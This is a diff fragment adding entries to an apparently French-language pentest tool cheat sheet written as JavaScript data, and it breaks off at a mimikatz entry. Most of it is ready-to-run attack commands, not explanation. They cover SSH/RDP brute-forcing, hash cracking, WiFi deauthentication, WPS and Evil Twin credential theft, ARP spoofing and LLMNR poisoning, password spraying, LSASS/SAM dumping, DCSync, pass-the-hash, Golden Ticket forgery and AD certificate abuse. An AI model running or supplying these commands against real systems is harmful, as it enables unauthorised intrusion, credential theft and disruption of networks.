+   {d:"Brute-force SSH",c:"ncrack -u admin -P rockyou.txt ssh://CIBLE"},
+   {d:"RDP",c:"ncrack -u administrator -P pass.txt rdp://CIBLE"},
+   {d:"Port précis",c:"ncrack -p 22 --user root -P pass.txt CIBLE"},
+   {d:"Plusieurs services",c:"ncrack CIBLE:22 CIBLE:3389"},
+   {d:"Régler l'intensité",c:"ncrack -T4 -u admin -P pass.txt ssh://CIBLE"}]},
+ {n:"patator",c:"pass",std:1,inst:"sudo apt install patator",r:"Brute-forcer multi-protocole en Python, redoutable quand hydra cale.",cmds:[
+   {d:"SSH",c:"patator ssh_login host=CIBLE user=admin password=FILE0 0=rockyou.txt"},
+   {d:"FTP",c:"patator ftp_login host=CIBLE user=FILE0 password=FILE1 0=users.txt 1=pass.txt"},
+   {d:"Ignorer les échecs (mot-clé)",c:"patator ssh_login host=CIBLE user=root password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed.'"},
+   {d:"Formulaire web",c:"patator http_fuzz url=http://CIBLE/login method=POST body='user=admin&pass=FILE0' 0=rockyou.txt -x ignore:code=200"},
+   {d:"Casser un zip",c:"patator unzip_pass zipfile=secret.zip password=FILE0 0=rockyou.txt"}]},
+ {n:"john",c:"pass",std:1,inst:"sudo apt install john",r:"John the Ripper : le cracker de hash polyvalent avec ses règles de mutation.",cmds:[
+   {d:"Cassage automatique",c:"john hashes.txt"},
+   {d:"Avec dictionnaire",c:"john --wordlist=rockyou.txt hashes.txt"},
+   {d:"Préciser le format",c:"john --format=nt --wordlist=rockyou.txt hashes.txt"},
+   {d:"Avec règles de mutation",c:"john --wordlist=rockyou.txt --rules hashes.txt"},
+   {d:"Afficher les mots trouvés",c:"john --show hashes.txt"},
+   {d:"Convertir un zip en hash",c:"zip2john secret.zip > zip.hash"},
+   {d:"Convertir une clé SSH",c:"ssh2john id_rsa > ssh.hash"},
+   {d:"Casser un /etc/shadow",c:"unshadow /etc/passwd /etc/shadow > mix.txt && john mix.txt"},
+   {d:"Mode incrémental (bruteforce)",c:"john --incremental hashes.txt"},
+   {d:"Lister les formats",c:"john --list=formats"}]},
+ {n:"hashcat",c:"pass",std:1,inst:"sudo apt install hashcat",r:"Le cracker de hash accéléré par GPU, roi des attaques massives.",cmds:[
+   {d:"NTLM par dictionnaire",c:"hashcat -m 1000 -a 0 hashes.txt rockyou.txt"},
+   {d:"MD5",c:"hashcat -m 0 -a 0 hashes.txt rockyou.txt"},
+   {d:"SHA-256",c:"hashcat -m 1400 -a 0 hashes.txt rockyou.txt"},
+   {d:"NetNTLMv2 (Responder)",c:"hashcat -m 5600 -a 0 hashes.txt rockyou.txt"},
+   {d:"Kerberos TGS-REP (Kerberoasting)",c:"hashcat -m 13100 -a 0 hashes.txt rockyou.txt"},
+   {d:"AS-REP Roasting",c:"hashcat -m 18200 -a 0 hashes.txt rockyou.txt"},
+   {d:"bcrypt",c:"hashcat -m 3200 -a 0 hashes.txt rockyou.txt"},
+   {d:"WPA/WPA2 (hccapx/22000)",c:"hashcat -m 22000 -a 0 capture.22000 rockyou.txt"},
+   {d:"Dictionnaire + règles",c:"hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule"},
+   {d:"Attaque par masque (8 chiffres)",c:"hashcat -m 0 -a 3 hashes.txt '?d?d?d?d?d?d?d?d'"},
+   {d:"Reprendre une session",c:"hashcat --restore"},
+   {d:"Afficher les hash cassés",c:"hashcat -m 1000 hashes.txt --show"},
+   {d:"Benchmark",c:"hashcat -b"}]},
+ {n:"hashid",c:"pass",std:1,inst:"sudo apt install hashid",r:"Identifie le type d'un hash inconnu pour viser le bon mode.",cmds:[
+   {d:"Identifier un hash",c:"hashid '5f4dcc3b5aa765d61d8327deb882cf99'"},
+   {d:"Afficher le mode hashcat",c:"hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'"},
+   {d:"Depuis un fichier",c:"hashid -mj hashes.txt"}]},
+ {n:"name-that-hash",c:"pass",std:0,inst:"pipx install name-that-hash",r:"Successeur moderne de hashid : identifie et donne modes hashcat/john en couleur.",cmds:[
+   {d:"Identifier un hash",c:"nth -t '5f4dcc3b5aa765d61d8327deb882cf99'"},
+   {d:"Depuis un fichier",c:"nth -f hashes.txt"},
+   {d:"Sortie la plus probable seulement",c:"nth -t HASH --no-banner"}]},
+ {n:"crunch",c:"pass",std:1,inst:"sudo apt install crunch",r:"Générateur de wordlists sur mesure selon longueur et jeu de caractères.",cmds:[
+   {d:"Longueur 6 à 8, minuscules",c:"crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt"},
+   {d:"Avec un motif (@ lettre, % chiffre)",c:"crunch 8 8 -t Pass@@%% -o w.txt"},
+   {d:"Jeu de caractères prédéfini",c:"crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha -o w.txt"},
+   {d:"Chiffres uniquement",c:"crunch 4 4 0123456789"},
+   {d:"Limiter la taille du fichier",c:"crunch 1 8 -o START -c 1000000"}]},
+ {n:"cewl",c:"pass",std:1,inst:"sudo apt install cewl",r:"Aspire les mots d'un site web pour forger une wordlist ciblée.",cmds:[
+   {d:"Générer depuis un site",c:"cewl http://CIBLE -w wordlist.txt"},
+   {d:"Profondeur et longueur mini",c:"cewl http://CIBLE -d 2 -m 6 -w wordlist.txt"},
+   {d:"Inclure les e-mails trouvés",c:"cewl http://CIBLE -e --email_file mails.txt"},
+   {d:"Compter les occurrences",c:"cewl http://CIBLE -c"}]},
+ {n:"cupp",c:"pass",std:0,inst:"sudo apt install cupp",r:"Fabrique un dictionnaire ultra-personnalisé à partir des infos d'une cible.",cmds:[
+   {d:"Mode interactif (profil cible)",c:"cupp -i"},
+   {d:"Télécharger les wordlists par défaut",c:"cupp -l"},
+   {d:"Améliorer une wordlist existante",c:"cupp -w wordlist.txt"}]},
+ {n:"hashpump",c:"pass",std:0,inst:"git clone https://github.com/bwall/HashPump",r:"Exploite les attaques par extension de longueur (hash length extension).",cmds:[
+   {d:"Générer l'extension",c:"hashpump -s SIGNATURE -d 'DONNEES' -a 'AJOUT' -k LONGUEUR_CLE"},
+   {d:"Mode interactif",c:"hashpump"}]},
+ {n:"fcrackzip",c:"pass",std:1,inst:"sudo apt install fcrackzip",r:"Casse les mots de passe d'archives ZIP par dictionnaire ou force brute.",cmds:[
+   {d:"Attaque par dictionnaire",c:"fcrackzip -u -D -p rockyou.txt secret.zip"},
+   {d:"Force brute (longueur/charset)",c:"fcrackzip -b -c a1 -l 1-6 -u secret.zip"},
+   {d:"Mode verbeux",c:"fcrackzip -v -u -D -p rockyou.txt secret.zip"}]},
+ {n:"pdfcrack",c:"pass",std:1,inst:"sudo apt install pdfcrack",r:"Récupère le mot de passe d'un PDF protégé.",cmds:[
+   {d:"Attaque par dictionnaire",c:"pdfcrack -f secret.pdf -w rockyou.txt"},
+   {d:"Force brute avec charset",c:"pdfcrack -f secret.pdf -c '0123456789' -n 4 -m 6"},
+   {d:"Reprendre depuis un état",c:"pdfcrack -f secret.pdf -l savedstate.sav"}]},
+ {n:"aircrack-ng",c:"wifi",std:1,inst:"sudo apt install aircrack-ng",r:"La suite WiFi de référence : le module qui casse les clés WEP/WPA capturées.",cmds:[
+   {d:"Casser du WPA/WPA2 par dictionnaire",c:"aircrack-ng -w rockyou.txt capture.cap"},
+   {d:"Préciser le BSSID",c:"aircrack-ng -b AA:BB:CC:DD:EE:FF -w rockyou.txt capture.cap"},
+   {d:"Casser du WEP",c:"aircrack-ng capture.cap"},
+   {d:"Convertir pour hashcat",c:"aircrack-ng capture.cap -j out.hccapx"},
+   {d:"Lister les réseaux d'une capture",c:"aircrack-ng capture.cap"}]},
+ {n:"airmon-ng",c:"wifi",std:1,inst:"sudo apt install aircrack-ng",r:"Bascule la carte WiFi en mode monitor pour écouter les ondes.",cmds:[
+   {d:"Tuer les processus gênants",c:"sudo airmon-ng check kill"},
+   {d:"Activer le mode monitor",c:"sudo airmon-ng start wlan0"},
+   {d:"Désactiver le mode monitor",c:"sudo airmon-ng stop wlan0mon"},
+   {d:"Lister les interfaces",c:"sudo airmon-ng"}]},
+ {n:"airodump-ng",c:"wifi",std:1,inst:"sudo apt install aircrack-ng",r:"Scanne les réseaux WiFi alentour et capture les handshakes.",cmds:[
+   {d:"Scanner tous les réseaux",c:"sudo airodump-ng wlan0mon"},
+   {d:"Cibler un réseau et capturer",c:"sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"},
+   {d:"Afficher les clients WPS",c:"sudo airodump-ng --wps wlan0mon"},
+   {d:"Bande 5 GHz",c:"sudo airodump-ng --band a wlan0mon"},
+   {d:"Forcer un canal",c:"sudo airodump-ng -c 1 wlan0mon"}]},
+ {n:"wifite",c:"wifi",std:1,inst:"sudo apt install wifite",r:"L'automate du pentest WiFi : audite tous les réseaux à portée en une commande.",cmds:[
+   {d:"Lancer l'audit automatique",c:"sudo wifite"},
+   {d:"Cibler uniquement WPA",c:"sudo wifite --wpa"},
+   {d:"Attaques WPS seulement",c:"sudo wifite --wps"},
+   {d:"Capturer le PMKID",c:"sudo wifite --pmkid"},
+   {d:"Réseaux au-dessus d'un seuil de signal",c:"sudo wifite --pow 50"},
+   {d:"Dictionnaire personnalisé",c:"sudo wifite --dict rockyou.txt"}]},
+ {n:"reaver",c:"wifi",std:1,inst:"sudo apt install reaver",r:"Attaque le PIN WPS pour récupérer la passphrase WPA d'un routeur vulnérable.",cmds:[
+   {d:"Attaque WPS classique",c:"sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv"},
+   {d:"Attaque Pixie Dust",c:"sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv"},
+   {d:"Fixer le canal",c:"sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv"},
+   {d:"Temporisation anti-lockout",c:"sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 15 -vv"}]},
+ {n:"bully",c:"wifi",std:1,inst:"sudo apt install bully",r:"Alternative à reaver pour l'attaque du PIN WPS, souvent plus robuste.",cmds:[
+   {d:"Attaque WPS",c:"sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6"},
+   {d:"Attaque Pixie Dust",c:"sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d"},
+   {d:"Mode verbeux",c:"sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3"}]},
+ {n:"kismet",c:"wifi",std:1,inst:"sudo apt install kismet",r:"Détecteur de réseaux sans-fil et sniffer passif avec interface web.",cmds:[
+   {d:"Lancer sur une interface",c:"sudo kismet -c wlan0"},
+   {d:"Interface web",c:"http://localhost:2501"},
+   {d:"Capturer vers un fichier",c:"sudo kismet -c wlan0 --log-prefix /tmp/capture"},
+   {d:"Mode sans affichage",c:"sudo kismet -c wlan0 --no-ncurses"}]},
+ {n:"mdk4",c:"wifi",std:1,inst:"sudo apt install mdk4",r:"Boîte à outils de stress-test WiFi : déauth, beacon flood, brouillage.",cmds:[
+   {d:"Déauthentification (tous clients)",c:"sudo mdk4 wlan0mon d -b blacklist.txt"},
+   {d:"Flood de faux points d'accès",c:"sudo mdk4 wlan0mon b -n FAKE_AP"},
+   {d:"Flood d'authentifications",c:"sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF"},
+   {d:"Test de balises (beacon)",c:"sudo mdk4 wlan0mon b -f ssids.txt"}]},
+ {n:"hcxdumptool",c:"wifi",std:1,inst:"sudo apt install hcxdumptool",r:"Capture les PMKID et handshakes dans un format directement cassable par hashcat.",cmds:[
+   {d:"Capturer les PMKID/handshakes",c:"sudo hcxdumptool -i wlan0mon -o capture.pcapng"},
+   {d:"Convertir pour hashcat (22000)",c:"hcxpcapngtool -o hash.22000 capture.pcapng"},
+   {d:"Filtrer sur un BSSID",c:"sudo hcxdumptool -i wlan0mon --bpf=bpf.txt -o capture.pcapng"},
+   {d:"Lister les interfaces",c:"hcxdumptool -l"}]},
+ {n:"fern-wifi-cracker",c:"wifi",std:0,inst:"sudo apt install fern-wifi-cracker",r:"Interface graphique qui enchaîne scan, capture et crack WiFi.",cmds:[
+   {d:"Lancer l'interface",c:"sudo fern-wifi-cracker"},
+   {d:"Sélectionner l'interface",c:"Select Interface → wlan0"},
+   {d:"Scanner puis choisir l'attaque",c:"Scan for Access Points → WiFi WPA"}]},
+ {n:"eaphammer",c:"wifi",std:0,inst:"git clone https://github.com/s0lst1c3/eaphammer",r:"Monte des attaques Evil Twin contre les réseaux WPA-Enterprise pour voler les identifiants.",cmds:[
+   {d:"Générer le certificat",c:"./eaphammer --cert-wizard"},
+   {d:"Attaque Evil Twin (vol d'identifiants)",c:"./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CORP --creds"},
+   {d:"Attaque PMKID / hostile portal",c:"./eaphammer -i wlan0 --essid CORP --captive-portal"}]},
+ {n:"airgeddon",c:"wifi",std:0,inst:"git clone https://github.com/v1s1t0r1sh3r3/airgeddon",r:"Script tout-en-un à menus qui orchestre toute la suite d'attaques WiFi.",cmds:[
+   {d:"Lancer le menu interactif",c:"sudo bash airgeddon.sh"},
+   {d:"Évil Twin, handshake, WPS, PMKID…",c:"suivre les menus à l'écran"}]},
+ {n:"wireshark",c:"mitm",std:1,inst:"sudo apt install wireshark",r:"L'analyseur de paquets de référence : dissèque le trafic réseau en profondeur.",cmds:[
+   {d:"Lancer l'interface graphique",c:"wireshark"},
+   {d:"Ouvrir une capture",c:"wireshark capture.pcap"},
+   {d:"Filtre d'affichage : HTTP",c:"http.request.method == \"POST\""},
+   {d:"Filtre : un hôte précis",c:"ip.addr == 192.168.1.10"},
+   {d:"Filtre : DNS",c:"dns"},
+   {d:"Filtre : identifiants en clair",c:"http.authbasic || ftp.request.command == \"PASS\""},
+   {d:"Suivre un flux TCP",c:"clic droit → Follow → TCP Stream"},
+   {d:"Filtre : credentials (menu)",c:"Tools → Credentials"}]},
+ {n:"tshark",c:"mitm",std:1,inst:"sudo apt install tshark",r:"La version console de Wireshark, parfaite pour scripter l'analyse réseau.",cmds:[
+   {d:"Capturer sur une interface",c:"sudo tshark -i eth0"},
+   {d:"Appliquer un filtre de capture",c:"sudo tshark -i eth0 -f 'tcp port 80'"},
+   {d:"Lire une capture avec filtre",c:"tshark -r capture.pcap -Y 'http.request'"},
+   {d:"Extraire des champs précis",c:"tshark -r capture.pcap -T fields -e ip.src -e http.host"},
+   {d:"Limiter le nombre de paquets",c:"sudo tshark -i eth0 -c 100 -w out.pcap"},
+   {d:"Statistiques des protocoles",c:"tshark -r capture.pcap -q -z io,phs"},
+   {d:"Extraire les objets HTTP",c:"tshark -r capture.pcap --export-objects http,/tmp/http_objs"}]},
+ {n:"tcpdump",c:"mitm",std:1,inst:"sudo apt install tcpdump",r:"Le sniffer en ligne de commande universel, présent sur presque tous les systèmes.",cmds:[
+   {d:"Capturer sur une interface",c:"sudo tcpdump -i eth0"},
+   {d:"Sauvegarder dans un fichier",c:"sudo tcpdump -i eth0 -w capture.pcap"},
+   {d:"Lire un fichier",c:"tcpdump -r capture.pcap"},
+   {d:"Filtrer un hôte et un port",c:"sudo tcpdump -i eth0 host 192.168.1.10 and port 80"},
+   {d:"Afficher le contenu ASCII",c:"sudo tcpdump -i eth0 -A port 80"},
+   {d:"Ne pas résoudre les noms",c:"sudo tcpdump -i eth0 -nn"},
+   {d:"Capturer le trafic DNS",c:"sudo tcpdump -i eth0 udp port 53"},
+   {d:"Limiter la taille des paquets",c:"sudo tcpdump -i eth0 -s 0 -w full.pcap"}]},
+ {n:"bettercap",c:"mitm",std:1,inst:"sudo apt install bettercap",r:"Le couteau suisse du MITM moderne : ARP spoofing, sniffing, injection, WiFi, BLE.",cmds:[
+   {d:"Lancer sur une interface",c:"sudo bettercap -iface eth0"},
+   {d:"Interface web (caplet)",c:"sudo bettercap -caplet http-ui"},
+   {d:"Scanner le réseau (dans le shell)",c:"net.probe on"},
+   {d:"Activer l'ARP spoofing",c:"set arp.spoof.targets 192.168.1.10; arp.spoof on"},
+   {d:"Sniffer le trafic",c:"net.sniff on"},
+   {d:"Injecter / proxy HTTP",c:"set http.proxy.script inject.js; http.proxy on"},
+   {d:"Capturer les identifiants",c:"events.stream on"}]},
+ {n:"ettercap",c:"mitm",std:1,inst:"sudo apt install ettercap-graphical",r:"La suite classique d'attaques MITM (ARP poisoning, filtres de contenu).",cmds:[
+   {d:"Interface graphique",c:"sudo ettercap -G"},
+   {d:"ARP poisoning entre deux cibles",c:"sudo ettercap -T -q -i eth0 -M arp /192.168.1.1// /192.168.1.10//"},
+   {d:"Sniffer tout le réseau",c:"sudo ettercap -T -q -i eth0 -M arp:remote //"},
+   {d:"Appliquer un filtre compilé",c:"sudo ettercap -T -i eth0 -F filter.ef -M arp //"},
+   {d:"Compiler un filtre",c:"etterfilter filter.ecf -o filter.ef"}]},
+ {n:"responder",c:"mitm",std:1,inst:"sudo apt install responder",r:"Empoisonne LLMNR/NBT-NS/mDNS pour piéger les authentifications Windows et voler les hash NetNTLM.",cmds:[
+   {d:"Écoute et empoisonnement",c:"sudo responder -I eth0"},
+   {d:"Mode verbeux",c:"sudo responder -I eth0 -v"},
+   {d:"Forcer l'authentification basique (WPAD)",c:"sudo responder -I eth0 -wb"},
+   {d:"Analyse passive (sans empoisonner)",c:"sudo responder -I eth0 -A"},
+   {d:"Récupérer les hash capturés",c:"cat /usr/share/responder/logs/*NTLMv2*"},
+   {d:"Fichier de configuration",c:"sudo nano /usr/share/responder/Responder.conf"}]},
+ {n:"dsniff",c:"mitm",std:1,inst:"sudo apt install dsniff",r:"Collection d'outils de sniffing qui extrait les identifiants en clair du réseau.",cmds:[
+   {d:"Capturer les mots de passe",c:"sudo dsniff -i eth0"},
+   {d:"Lire depuis une capture",c:"dsniff -p capture.pcap"},
+   {d:"Capturer les URLs visitées (urlsnarf)",c:"sudo urlsnarf -i eth0"},
+   {d:"Voler les images vues (driftnet via arpspoof)",c:"sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1"}]},
+ {n:"scapy",c:"mitm",std:1,inst:"sudo apt install python3-scapy",r:"La bibliothèque Python qui forge, envoie et dissèque n'importe quel paquet réseau.",cmds:[
+   {d:"Lancer l'interpréteur",c:"sudo scapy"},
+   {d:"Forger et envoyer un ping ICMP",c:"send(IP(dst='CIBLE')/ICMP())"},
+   {d:"Scan SYN d'un port",c:"sr1(IP(dst='CIBLE')/TCP(dport=80,flags='S'))"},
+   {d:"Sniffer 10 paquets",c:"sniff(count=10,prn=lambda p:p.summary())"},
+   {d:"Traceroute maison",c:"traceroute(['CIBLE'])"},
+   {d:"Lire un pcap",c:"pkts=rdpcap('capture.pcap'); pkts.summary()"}]},
+ {n:"mitm6",c:"mitm",std:0,inst:"pipx install mitm6",r:"Abuse de l'IPv6 par défaut de Windows pour détourner le DNS et relayer vers l'AD.",cmds:[
+   {d:"Empoisonner le DNS IPv6 d'un domaine",c:"sudo mitm6 -d corp.local"},
+   {d:"Combiner avec ntlmrelayx",c:"sudo mitm6 -d corp.local & impacket-ntlmrelayx -6 -t ldaps://dc.corp.local -wh fake.corp.local --delegate-access"},
+   {d:"Limiter à un hôte cible",c:"sudo mitm6 -d corp.local -hw VICTIME"}]},
+ {n:"enum4linux",c:"ad",std:1,inst:"sudo apt install enum4linux",r:"Le classique pour énumérer partages, utilisateurs et politiques via SMB/RPC.",cmds:[
+   {d:"Énumération complète",c:"enum4linux -a CIBLE"},
+   {d:"Lister les utilisateurs",c:"enum4linux -U CIBLE"},
+   {d:"Lister les partages",c:"enum4linux -S CIBLE"},
+   {d:"Politique de mots de passe",c:"enum4linux -P CIBLE"},
+   {d:"Avec identifiants",c:"enum4linux -u user -p pass -a CIBLE"}]},
+ {n:"enum4linux-ng",c:"ad",std:0,inst:"pipx install enum4linux-ng",r:"Réécriture moderne d'enum4linux : plus rapide, sortie YAML/JSON exploitable.",cmds:[
+   {d:"Énumération complète",c:"enum4linux-ng -A CIBLE"},
+   {d:"Avec identifiants",c:"enum4linux-ng -A -u user -p pass CIBLE"},
+   {d:"Utilisateurs et groupes",c:"enum4linux-ng -U -G CIBLE"},
+   {d:"Export JSON",c:"enum4linux-ng -A CIBLE -oJ resultat"},
+   {d:"Énumération via RID cycling",c:"enum4linux-ng -R CIBLE"}]},
+ {n:"smbmap",c:"ad",std:1,inst:"sudo apt install smbmap",r:"Cartographie les partages SMB et les droits d'accès, avec exécution de commandes.",cmds:[
+   {d:"Lister les partages (null session)",c:"smbmap -H CIBLE"},
+   {d:"Avec identifiants",c:"smbmap -u user -p pass -H CIBLE"},
+   {d:"Parcourir récursivement un partage",c:"smbmap -u user -p pass -H CIBLE -r 'C$'"},
+   {d:"Télécharger un fichier",c:"smbmap -u user -p pass -H CIBLE --download 'C$\\Users\\admin\\flag.txt'"},
+   {d:"Exécuter une commande",c:"smbmap -u user -p pass -H CIBLE -x 'whoami'"},
+   {d:"Pass-the-hash",c:"smbmap -u admin -p ':NTLMHASH' -H CIBLE"}]},
+ {n:"smbclient",c:"ad",std:1,inst:"sudo apt install smbclient",r:"Le client SMB façon FTP pour explorer et récupérer des fichiers sur les partages Windows.",cmds:[
+   {d:"Lister les partages (anonyme)",c:"smbclient -L //CIBLE -N"},
+   {d:"Se connecter à un partage",c:"smbclient //CIBLE/partage -U user"},
+   {d:"Session nulle",c:"smbclient //CIBLE/IPC$ -N"},
+   {d:"Télécharger un fichier",c:"smbclient //CIBLE/partage -U user -c 'get secret.txt'"},
+   {d:"Tout récupérer (mode mask)",c:"smbclient //CIBLE/partage -U user -c 'prompt OFF;recurse ON;mget *'"},
+   {d:"Pass-the-hash",c:"smbclient //CIBLE/C$ -U admin --pw-nt-hash NTLMHASH"}]},
+ {n:"netexec",c:"ad",std:0,inst:"pipx install netexec",r:"Le successeur de CrackMapExec : balaye et exploite SMB, WinRM, LDAP, MSSQL, RDP à grande échelle.",cmds:[
+   {d:"Tester des identifiants en SMB",c:"netexec smb CIBLE -u user -p pass"},
+   {d:"Pass-the-hash",c:"netexec smb CIBLE -u admin -H NTLMHASH"},
+   {d:"Password spraying sur un sous-réseau",c:"netexec smb 192.168.1.0/24 -u users.txt -p 'Hiver2025!'"},
+   {d:"Lister les partages",c:"netexec smb CIBLE -u user -p pass --shares"},
+   {d:"Dump SAM",c:"netexec smb CIBLE -u admin -p pass --sam"},
+   {d:"Dump LSASS (lsassy)",c:"netexec smb CIBLE -u admin -p pass -M lsassy"},
+   {d:"Récupérer les secrets LSA",c:"netexec smb CIBLE -u admin -p pass --lsa"},
+   {d:"Kerberoasting via LDAP",c:"netexec ldap CIBLE -u user -p pass --kerberoasting kerb.txt"},
+   {d:"AS-REP Roasting",c:"netexec ldap CIBLE -u users.txt -p '' --asreproast asrep.txt"},
+   {d:"Commande à distance via WinRM",c:"netexec winrm CIBLE -u admin -p pass -x 'whoami'"},
+   {d:"Lister les modules",c:"netexec smb -L"}]},
+ {n:"crackmapexec",c:"ad",std:1,inst:"sudo apt install crackmapexec",r:"L'ancêtre de netexec : le couteau suisse de l'exploitation AD en masse (toujours courant).",cmds:[
+   {d:"Tester des identifiants SMB",c:"crackmapexec smb CIBLE -u user -p pass"},
+   {d:"Pass-the-hash",c:"crackmapexec smb CIBLE -u admin -H NTLMHASH"},
+   {d:"Password spraying",c:"crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Printemps2025!'"},
+   {d:"Lister les partages",c:"crackmapexec smb CIBLE -u user -p pass --shares"},
+   {d:"Dump SAM",c:"crackmapexec smb CIBLE -u admin -p pass --sam"},
+   {d:"Exécuter une commande",c:"crackmapexec smb CIBLE -u admin -p pass -x 'ipconfig'"},
+   {d:"Énumérer via WinRM",c:"crackmapexec winrm CIBLE -u user -p pass"}]},
+ {n:"rpcclient",c:"ad",std:1,inst:"sudo apt install samba-common-bin",r:"Interroge l'interface MS-RPC pour énumérer utilisateurs, groupes et SID.",cmds:[
+   {d:"Connexion en session nulle",c:"rpcclient -U '' -N CIBLE"},
+   {d:"Lister les utilisateurs",c:"rpcclient -U '' -N CIBLE -c 'enumdomusers'"},
+   {d:"Info d'un utilisateur par RID",c:"rpcclient -U '' -N CIBLE -c 'queryuser 0x1f4'"},
+   {d:"Lister les groupes",c:"rpcclient -U '' -N CIBLE -c 'enumdomgroups'"},
+   {d:"Lister les partages",c:"rpcclient -U '' -N CIBLE -c 'netshareenum'"},
+   {d:"Résoudre un SID",c:"rpcclient -U '' -N CIBLE -c 'lookupsids S-1-5-21-...'"}]},
+ {n:"impacket",c:"ad",std:1,inst:"sudo apt install impacket-scripts",r:"La boîte à outils Python incontournable de l'AD : secretsdump, psexec, Kerberos et bien plus.",cmds:[
+   {d:"Dump des hash du domaine (DCSync)",c:"impacket-secretsdump corp.local/admin:pass@dc.corp.local"},
+   {d:"DCSync pass-the-hash",c:"impacket-secretsdump -hashes :NTLMHASH corp.local/admin@dc.corp.local"},
+   {d:"Shell SYSTEM à distance",c:"impacket-psexec corp.local/admin:pass@CIBLE"},
+   {d:"Exécution plus furtive (WMI)",c:"impacket-wmiexec corp.local/admin:pass@CIBLE"},
+   {d:"Kerberoasting",c:"impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request"},
+   {d:"AS-REP Roasting",c:"impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip DC_IP"},
+   {d:"Relais NTLM",c:"impacket-ntlmrelayx -tf targets.txt -smb2support"},
+   {d:"Forger un Golden Ticket",c:"impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator"},
+   {d:"Shell MSSQL",c:"impacket-mssqlclient corp.local/user:pass@CIBLE -windows-auth"},
+   {d:"Pass-the-hash avec smbclient",c:"impacket-smbclient -hashes :NTLMHASH corp.local/admin@CIBLE"}]},
+ {n:"evil-winrm",c:"ad",std:1,inst:"sudo apt install evil-winrm",r:"Le shell WinRM du pentester : prise en main interactive d'une machine Windows.",cmds:[
+   {d:"Connexion par mot de passe",c:"evil-winrm -i CIBLE -u admin -p pass"},
+   {d:"Pass-the-hash",c:"evil-winrm -i CIBLE -u admin -H NTLMHASH"},
+   {d:"Authentification Kerberos",c:"evil-winrm -i dc.corp.local -u admin -r corp.local"},
+   {d:"Dossier de scripts à charger",c:"evil-winrm -i CIBLE -u admin -p pass -s /opt/scripts/"},
+   {d:"Uploader un fichier (dans le shell)",c:"upload winpeas.exe"},
+   {d:"Télécharger un fichier",c:"download C:\\loot\\flag.txt"}]},
+ {n:"bloodhound",c:"ad",std:0,inst:"pipx install bloodhound-ce && sudo apt install bloodhound",r:"Cartographie les relations de l'AD en graphe pour trouver les chemins vers Domain Admin.",cmds:[
+   {d:"Collecte à distance (Python)",c:"bloodhound-python -d corp.local -u user -p pass -c All -ns DC_IP"},
+   {d:"Collecte avec hash",c:"bloodhound-python -d corp.local -u user --hashes :NTLMHASH -c All -ns DC_IP"},
+   {d:"Lancer l'interface (ancienne version)",c:"sudo neo4j start && bloodhound"},
+   {d:"Collecteur Windows (SharpHound)",c:"SharpHound.exe -c All"},
+   {d:"Requête cypher utile",c:"MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p"}]},
+ {n:"kerbrute",c:"ad",std:0,inst:"go install github.com/ropnop/kerbrute@latest",r:"Énumère et brute-force les comptes AD très vite via le pré-auth Kerberos.",cmds:[
+   {d:"Énumérer des utilisateurs valides",c:"kerbrute userenum -d corp.local --dc DC_IP users.txt"},
+   {d:"Password spraying",c:"kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Automne2025!'"},
+   {d:"Brute-force un seul utilisateur",c:"kerbrute bruteuser -d corp.local --dc DC_IP pass.txt admin"},
+   {d:"Tester une liste user:pass",c:"kerbrute bruteforce -d corp.local --dc DC_IP combos.txt"}]},
+ {n:"ldapsearch",c:"ad",std:1,inst:"sudo apt install ldap-utils",r:"Interroge directement l'annuaire LDAP pour en extraire toute la structure du domaine.",cmds:[
+   {d:"Dump anonyme du naming context",c:"ldapsearch -x -H ldap://DC_IP -s base namingContexts"},
+   {d:"Lister tous les objets",c:"ldapsearch -x -H ldap://DC_IP -D 'user@corp.local' -w pass -b 'DC=corp,DC=local'"},
+   {d:"Lister les utilisateurs",c:"ldapsearch -x -H ldap://DC_IP -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName"},
+   {d:"Trouver les comptes AS-REP roastables",c:"ldapsearch -x -H ldap://DC_IP -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'"},
+   {d:"Lister les SPN (kerberoasting)",c:"ldapsearch -x -H ldap://DC_IP -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(servicePrincipalName=*)' servicePrincipalName"}]},
+ {n:"certipy",c:"ad",std:0,inst:"pipx install certipy-ad",r:"Traque et exploite les failles d'AD Certificate Services (ESC1 à ESC8).",cmds:[
+   {d:"Trouver les templates vulnérables",c:"certipy find -u user@corp.local -p pass -dc-ip DC_IP -vulnerable"},
+   {d:"Exploiter ESC1 (demander un cert)",c:"certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local"},
+   {d:"S'authentifier avec le certificat",c:"certipy auth -pfx administrator.pfx -dc-ip DC_IP"},
+   {d:"Shadow Credentials",c:"certipy shadow auto -u user@corp.local -p pass -account victime"}]},
+ {n:"mimikatz",c:"ad",std:0,inst:"git clone https://github.com/gentilkiwi/mimikatz",r:"La légende de l'extraction d'identifiants Windows : mots de passe, hash, tickets Kerberos.",cmds:[
+   {d:"Activer les privilèges debug",c:"privilege::debug"},
